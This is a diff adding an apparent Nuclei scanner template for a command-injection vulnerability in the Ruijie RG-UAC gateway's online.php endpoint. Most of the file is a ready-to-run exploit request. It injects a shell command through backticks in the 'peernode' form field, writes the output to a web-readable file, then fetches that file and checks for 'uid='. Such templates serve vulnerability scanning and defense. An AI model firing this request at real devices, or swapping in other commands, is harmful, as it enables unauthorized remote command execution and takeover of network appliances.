@@ -1,0 +1,37 @@
+id: ruijie-uac-online-rce-login
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 锐捷RG-UAC中存在命令执行漏洞，应用程序管理网关后端 /view/vpn/autovpn/online.php接口。攻击者可以执行任意命令来控制服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/1d1ffb9f40ef425e6558f039fb2296fe4a89b584/%E9%94%90%E6%8D%B7RG-UAC%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fonline.php%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /view/vpn/autovpn/online.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Origin: http://{{Hostname}}
+        Sec-Gpc: 1
+        Referer: http://{{Hostname}}/view/fireWall/PreDOSattack/list.php
+        Cookie: PHPSESSID=ebd507c9bc5a4293c3e5e596f37157bf
+        Upgrade-Insecure-Requests: 1
+        X-Forwarded-For: 0000:0000:0000::0000
+        X-Originating-Ip: 0000:0000:0000::0000
+        X-Remote-Ip: 0000:0000:0000::0000
+        X-Remote-Addr: 0000:0000:0000::0000
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 20
+
+        peernode=`id+>1.txt`
+      - |+
+        GET /view/vpn/autovpn/1.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
